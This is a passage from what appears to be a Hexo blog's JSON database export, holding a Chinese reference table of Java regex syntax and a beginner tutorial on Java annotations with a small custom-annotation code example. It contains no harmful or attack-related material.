反向范围字符。匹配不在指定的范围内的任何字符。例如，\"[^a-z]\"匹配任何不在\"a\"到\"z\"范围内的任何字符。 |\n| \\b            | 匹配一个字边界，即字与空格间的位置。例如，\"er\\b\"匹配\"never\"中的\"er\"，但不匹配\"verb\"中的\"er\"。 |\n| \\B            | 非字边界匹配。\"er\\B\"匹配\"verb\"中的\"er\"，但不匹配\"never\"中的\"er\"。 |\n| \\c*x*         | 匹配 *x* 指示的控制字符。例如，\\cM 匹配 Control-M 或回车符。*x* 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是\"c\"字符本身。 |\n| \\d            | 数字字符匹配。等效于 [0-9]。                                 |\n| \\D            | 非数字字符匹配。等效于 [^0-9]。                              |\n| \\f            | 换页符匹配。等效于 \\x0c 和 \\cL。                             |\n| \\n            | 换行符匹配。等效于 \\x0a 和 \\cJ。                             |\n| \\r            | 匹配一个回车符。等效于 \\x0d 和 \\cM。                         |\n| \\s            | 匹配任何空白字符，包括空格、制表符、换页符等。与 [ \\f\\n\\r\\t\\v] 等效。 |\n| \\S            | 匹配任何非空白字符。与 [^ \\f\\n\\r\\t\\v] 等效。                 |\n| \\t            | 制表符匹配。与 \\x09 和 \\cI 等效。                            |\n| \\v            | 垂直制表符匹配。与 \\x0b 和 \\cK 等效。                        |\n| \\w            | 匹配任何字类字符，包括下划线。与\"[A-Za-z0-9_]\"等效。         |\n| \\W            | 与任何非单词字符匹配。与\"[^A-Za-z0-9_]\"等效。                |\n| \\x*n*         | 匹配 *n*，此处的 *n* 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，\"\\x41\"匹配\"A\"。\"\\x041\"与\"\\x04\"&\"1\"等效。允许在正则表达式中使用 ASCII 代码。 |\n| \\*num*        | 匹配 *num*，此处的 *num* 是一个正整数。到捕获匹配的反向引用。例如，\"(.)\\1\"匹配两个连续的相同字符。 |\n| \\*n*          | 标识一个八进制转义码或反向引用。如果 \\*n* 前面至少有 *n* 个捕获子表达式，那么 *n* 是反向引用。否则，如果 *n* 是八进制数 (0-7)，那么 *n* 是八进制转义码。 |\n| \\*nm*         | 标识一个八进制转义码或反向引用。如果 \\*nm* 前面至少有 *nm* 个捕获子表达式，那么 *nm* 是反向引用。如果 \\*nm* 前面至少有 *n* 个捕获，则 *n* 是反向引用，后面跟有字符 *m*。如果两种前面的情况都不存在，则 \\*nm* 匹配八进制值 *nm*，其中 *n* 和 *m* 是八进制数字 (0-7)。 |\n| \\nml          | 当 *n* 是八进制数 (0-3)，*m* 和 *l* 是八进制数 (0-7) 时，匹配八进制转义码 *nml*。 |\n| \\u*n*         | 匹配 *n*，其中 *n* 是以四位十六进制数表示的 Unicode 字符。例如，\\u00A9 匹配版权符号 (©)。 |\n","slug":"java正则语法表","published":1,"updated":"2022-01-07T13:31:06.119Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mm001dgsw975xady3t","content":"<table>\n<thead>\n<tr>\n<th align=\"left\">字符</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">\\</td>\n<td align=\"left\">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\\n</strong> 匹配换行符。序列 <strong>\\\\** 匹配 *<em>\\*</em> ，</strong>\\(** 匹配 **(**。</td>\n</tr>\n<tr>\n<td align=\"left\">^</td>\n<td align=\"left\">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\\n”或”\\r”之后的位置匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">$</td>\n<td align=\"left\">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\\n”或”\\r”之前的位置匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">*</td>\n<td align=\"left\">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td>\n</tr>\n<tr>\n<td align=\"left\">+</td>\n<td align=\"left\">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td>\n</tr>\n<tr>\n<td align=\"left\">?</td>\n<td align=\"left\">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>}</td>\n<td align=\"left\"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>,}</td>\n<td align=\"left\"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>,<em>m</em>}</td>\n<td align=\"left\"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td>\n</tr>\n<tr>\n<td align=\"left\">?</td>\n<td align=\"left\">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td>\n</tr>\n<tr>\n<td align=\"left\">.</td>\n<td align=\"left\">匹配除”\\r\\n”之外的任何单个字符。若要匹配包括”\\r\\n”在内的任意字符，请使用诸如”[\\s\\S]”之类的模式。</td>\n</tr>\n<tr>\n<td align=\"left\">(<em>pattern</em>)</td>\n<td align=\"left\">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td>\n</tr>\n<tr>\n<td align=\"left\">(?:<em>pattern</em>)</td>\n<td align=\"left\">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td>\n</tr>\n<tr>\n<td align=\"left\">(?=<em>pattern</em>)</td>\n<td align=\"left\">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>\n</tr>\n<tr>\n<td align=\"left\">(?!<em>pattern</em>)</td>\n<td align=\"left\">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>x</em>|<em>y</em></td>\n<td align=\"left\">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td>\n</tr>\n<tr>\n<td align=\"left\">[<em>xyz</em>]</td>\n<td align=\"left\">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td>\n</tr>\n<tr>\n<td align=\"left\">[^<em>xyz</em>]</td>\n<td align=\"left\">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td>\n</tr>\n<tr>\n<td align=\"left\">[<em>a-z</em>]</td>\n<td align=\"left\">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td>\n</tr>\n<tr>\n<td align=\"left\">[^<em>a-z</em>]</td>\n<td align=\"left\">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td>\n</tr>\n<tr>\n<td align=\"left\">\\b</td>\n<td align=\"left\">匹配一个字边界，即字与空格间的位置。例如，”er\\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td>\n</tr>\n<tr>\n<td align=\"left\">\\B</td>\n<td align=\"left\">非字边界匹配。”er\\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td>\n</tr>\n<tr>\n<td align=\"left\">\\c<em>x</em></td>\n<td align=\"left\">匹配 <em>x</em> 指示的控制字符。例如，\\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td>\n</tr>\n<tr>\n<td align=\"left\">\\d</td>\n<td align=\"left\">数字字符匹配。等效于 [0-9]。</td>\n</tr>\n<tr>\n<td align=\"left\">\\D</td>\n<td align=\"left\">非数字字符匹配。等效于 [^0-9]。</td>\n</tr>\n<tr>\n<td align=\"left\">\\f</td>\n<td align=\"left\">换页符匹配。等效于 \\x0c 和 \\cL。</td>\n</tr>\n<tr>\n<td align=\"left\">\\n</td>\n<td align=\"left\">换行符匹配。等效于 \\x0a 和 \\cJ。</td>\n</tr>\n<tr>\n<td align=\"left\">\\r</td>\n<td align=\"left\">匹配一个回车符。等效于 \\x0d 和 \\cM。</td>\n</tr>\n<tr>\n<td align=\"left\">\\s</td>\n<td align=\"left\">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \\f\\n\\r\\t\\v] 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\S</td>\n<td align=\"left\">匹配任何非空白字符。与 [^ \\f\\n\\r\\t\\v] 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\t</td>\n<td align=\"left\">制表符匹配。与 \\x09 和 \\cI 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\v</td>\n<td align=\"left\">垂直制表符匹配。与 \\x0b 和 \\cK 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\w</td>\n<td align=\"left\">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\W</td>\n<td align=\"left\">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\x<em>n</em></td>\n<td align=\"left\">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\\x41”匹配”A”。”\\x041”与”\\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td>\n</tr>\n<tr>\n<td align=\"left\">*num*</td>\n<td align=\"left\">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\\1”匹配两个连续的相同字符。</td>\n</tr>\n<tr>\n<td align=\"left\">*n*</td>\n<td align=\"left\">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td>\n</tr>\n<tr>\n<td align=\"left\">*nm*</td>\n<td align=\"left\">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td>\n</tr>\n<tr>\n<td align=\"left\">\\nml</td>\n<td align=\"left\">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">\\u<em>n</em></td>\n<td align=\"left\">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\\u00A9 匹配版权符号 (©)。</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<table>\n<thead>\n<tr>\n<th align=\"left\">字符</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">\\</td>\n<td align=\"left\">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\\n</strong> 匹配换行符。序列 <strong>\\\\** 匹配 *<em>\\*</em> ，</strong>\\(** 匹配 **(**。</td>\n</tr>\n<tr>\n<td align=\"left\">^</td>\n<td align=\"left\">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\\n”或”\\r”之后的位置匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">$</td>\n<td align=\"left\">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\\n”或”\\r”之前的位置匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">*</td>\n<td align=\"left\">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td>\n</tr>\n<tr>\n<td align=\"left\">+</td>\n<td align=\"left\">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td>\n</tr>\n<tr>\n<td align=\"left\">?</td>\n<td align=\"left\">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>}</td>\n<td align=\"left\"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>,}</td>\n<td align=\"left\"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td>\n</tr>\n<tr>\n<td align=\"left\">{<em>n</em>,<em>m</em>}</td>\n<td align=\"left\"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td>\n</tr>\n<tr>\n<td align=\"left\">?</td>\n<td align=\"left\">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td>\n</tr>\n<tr>\n<td align=\"left\">.</td>\n<td align=\"left\">匹配除”\\r\\n”之外的任何单个字符。若要匹配包括”\\r\\n”在内的任意字符，请使用诸如”[\\s\\S]”之类的模式。</td>\n</tr>\n<tr>\n<td align=\"left\">(<em>pattern</em>)</td>\n<td align=\"left\">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td>\n</tr>\n<tr>\n<td align=\"left\">(?:<em>pattern</em>)</td>\n<td align=\"left\">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td>\n</tr>\n<tr>\n<td align=\"left\">(?=<em>pattern</em>)</td>\n<td align=\"left\">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>\n</tr>\n<tr>\n<td align=\"left\">(?!<em>pattern</em>)</td>\n<td align=\"left\">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>\n</tr>\n<tr>\n<td align=\"left\"><em>x</em>|<em>y</em></td>\n<td align=\"left\">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td>\n</tr>\n<tr>\n<td align=\"left\">[<em>xyz</em>]</td>\n<td align=\"left\">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td>\n</tr>\n<tr>\n<td align=\"left\">[^<em>xyz</em>]</td>\n<td align=\"left\">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td>\n</tr>\n<tr>\n<td align=\"left\">[<em>a-z</em>]</td>\n<td align=\"left\">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td>\n</tr>\n<tr>\n<td align=\"left\">[^<em>a-z</em>]</td>\n<td align=\"left\">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td>\n</tr>\n<tr>\n<td align=\"left\">\\b</td>\n<td align=\"left\">匹配一个字边界，即字与空格间的位置。例如，”er\\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td>\n</tr>\n<tr>\n<td align=\"left\">\\B</td>\n<td align=\"left\">非字边界匹配。”er\\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td>\n</tr>\n<tr>\n<td align=\"left\">\\c<em>x</em></td>\n<td align=\"left\">匹配 <em>x</em> 指示的控制字符。例如，\\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td>\n</tr>\n<tr>\n<td align=\"left\">\\d</td>\n<td align=\"left\">数字字符匹配。等效于 [0-9]。</td>\n</tr>\n<tr>\n<td align=\"left\">\\D</td>\n<td align=\"left\">非数字字符匹配。等效于 [^0-9]。</td>\n</tr>\n<tr>\n<td align=\"left\">\\f</td>\n<td align=\"left\">换页符匹配。等效于 \\x0c 和 \\cL。</td>\n</tr>\n<tr>\n<td align=\"left\">\\n</td>\n<td align=\"left\">换行符匹配。等效于 \\x0a 和 \\cJ。</td>\n</tr>\n<tr>\n<td align=\"left\">\\r</td>\n<td align=\"left\">匹配一个回车符。等效于 \\x0d 和 \\cM。</td>\n</tr>\n<tr>\n<td align=\"left\">\\s</td>\n<td align=\"left\">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \\f\\n\\r\\t\\v] 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\S</td>\n<td align=\"left\">匹配任何非空白字符。与 [^ \\f\\n\\r\\t\\v] 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\t</td>\n<td align=\"left\">制表符匹配。与 \\x09 和 \\cI 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\v</td>\n<td align=\"left\">垂直制表符匹配。与 \\x0b 和 \\cK 等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\w</td>\n<td align=\"left\">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\W</td>\n<td align=\"left\">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td>\n</tr>\n<tr>\n<td align=\"left\">\\x<em>n</em></td>\n<td align=\"left\">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\\x41”匹配”A”。”\\x041”与”\\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td>\n</tr>\n<tr>\n<td align=\"left\">*num*</td>\n<td align=\"left\">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\\1”匹配两个连续的相同字符。</td>\n</tr>\n<tr>\n<td align=\"left\">*n*</td>\n<td align=\"left\">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td>\n</tr>\n<tr>\n<td align=\"left\">*nm*</td>\n<td align=\"left\">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td>\n</tr>\n<tr>\n<td align=\"left\">\\nml</td>\n<td align=\"left\">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td>\n</tr>\n<tr>\n<td align=\"left\">\\u<em>n</em></td>\n<td align=\"left\">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\\u00A9 匹配版权符号 (©)。</td>\n</tr>\n</tbody></table>\n"},{"title":"java注解","date":"2022-01-11T05:12:36.000Z","_content":"\n## 注解(Annotation)\n\n<!--more-->\n\n### 注解简介\n\n##### 注解的作用:\n\n- 不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)\n- 可以被其他程序(比如编译器等)读取\n\n##### 注解的格式:\n\n注解是以\"@注解名\"在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=\"unchecked\")\n\n##### 注解在哪里使用\n\n可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问\n\n### 内置注解\n\n##### @Override\n\n定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写\n\n##### @Deprecated\n\n定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择\n\n##### @SuppressWarnings\n\n定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用\n\n例如:\n\n- @SuppressWarnings(\"all\")\n\n- @SuppressWarnings(\"unchecked\")\n\n- @SuppressWarnings(value={\"unchecked\",\"deprecation\"})\n\n能传递多个参数源自于其源码中的最后一行\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111133538313.png\" alt=\"image-20220111133538313\" style=\"zoom:80%;\" />\n\n- .......\n\n### 元注解\n\n元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)\n\n- @Target \n\n用于表示注解的使用范围\n\n​\t\t\t\t\t\t\t  @Target(ElementType.TYPE)   //接口、类、枚举\n\n　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量\n\n　　　　　　　　@Target(ElementType.METHOD) //方法\n\n　　　　　　　　@Target(ElementType.PARAMETER) //方法参数\n\n　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数\n\n　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量\n\n　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解\n\n　　　　　　　　@Target(ElementType.PACKAGE) ///包   \n\n\n- @Retention\n\n表示需要在什么级别保存该注释信息,用于描述注解的声明周期\n\nRuntime>class>source\n\n- @Documented\n\n说明该注解将被包含在javadoc中\n\n- @Inherited\n\n说明子类可以继承父类中的该注解\n\n### 自定义注解\n\n使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口\n\n- 格式\n\npublic @ interface 注解名 {定义内容}\n\n- 其中的每一个方法实际上是声明了一个配置参数\n\n- 方法的名称就是参数的名称\n- 返回值类型就是参数的类型(返回值只能是Class,String,enum)\n- 可以通过default来声明参数的默认值\n- 如果只有一个参数成员,一般参数名为value<label style=\"color:red\">(value参数可以省略传参)</label>\n- 注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值\n\n```java\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\npublic class test1 {\n    @myAnnotation(Class = \"不写默认就是一班二班\")\n    public void method(){\n    }\n}\n@Target({ElementType.TYPE, ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@interface myAnnotation{\n    //注解的参数:参数类型+参数名();\n    String name() default \"lol\";//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数\n    String [] Class() default {\"一班\",\"二班\"};\n}\n```\n\n","source":"_posts/java注解.md","raw":"---\ntitle: java注解\ndate: 2022-01-11 13:12:36\ntags:\n      - java\ncategories: java\n---\n\n## 注解(Annotation)\n\n<!--more-->\n\n### 注解简介\n\n##### 注解的作用:\n\n- 不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)\n- 可以被其他程序(比如编译器等)读取\n\n##### 注解的格式:\n\n注解是以\"@注解名\"在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=\"unchecked\")\n\n##### 注解在哪里使用\n\n可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问\n\n### 内置注解\n\n##### @Override\n\n定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写\n\n##### @Deprecated\n\n定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择\n\n##### @SuppressWarnings\n\n定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用\n\n例如:\n\n- @SuppressWarnings(\"all\")\n\n- @SuppressWarnings(\"unchecked\")\n\n- @SuppressWarnings(value={\"unchecked\",\"deprecation\"})\n\n能传递多个参数源自于其源码中的最后一行\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111133538313.png\" alt=\"image-20220111133538313\" style=\"zoom:80%;\" />\n\n- .......\n\n### 元注解\n\n元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)\n\n- @Target \n\n用于表示注解的使用范围\n\n​\t\t\t\t\t\t\t  @Target(ElementType.TYPE)   //接口、类、枚举\n\n　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量\n\n　　　　　　　　@Target(ElementType.METHOD) //方法\n\n　　　　　　　　@Target(ElementType.PARAMETER) //方法参数\n\n　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数\n\n　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量\n\n　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解\n\n　　　　　　　　@Target(ElementType.PACKAGE) ///包   \n\n\n- @Retention\n\n表示需要在什么级别保存该注释信息,用于描述注解的声明周期\n\nRuntime>class>source\n\n- @Documented\n\n说明该注解将被包含在javadoc中\n\n- @Inherited\n\n说明子类可以继承父类中的该注解\n\n### 自定义注解\n\n使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口\n\n- 格式\n\npublic @ interface 注解名 {定义内容}\n\n- 其中的每一个方法实际上是声明了一个配置参数\n\n- 方法的名称就是参数的名称\n- 返回值类型就是参数的类型(返回值只能是Class,String,enum)\n- 可以通过default来声明参数的默认值\n- 如果只有一个参数成员,一般参数名为value<label style=\"color:red\">(value参数可以省略传参)</label>\n- 注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值\n\n```java\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\npublic class test1 {\n    @myAnnotation(Class = \"不写默认就是一班二班\")\n    public void method(){\n    }\n}\n@Target({ElementType.TYPE, ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@interface myAnnotation{\n    //注解的参数:参数类型+参数名();\n    String name() default \"lol\";//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数\n    String [] Class() default {\"一班\",\"二班\"};\n}\n```\n\n","slug":"java注解","published":1,"updated":"2022-01-11T06:08:46.105Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mr001hgsw93juu2wuk","content":"<h2 id=\"注解-Annotation\"><a href=\"#注解-Annotation\" class=\"headerlink\" title=\"注解(Annotation)\"></a>注解(Annotation)</h2><span id=\"more\"></span>\n\n<h3 id=\"注解简介\"><a href=\"#注解简介\" 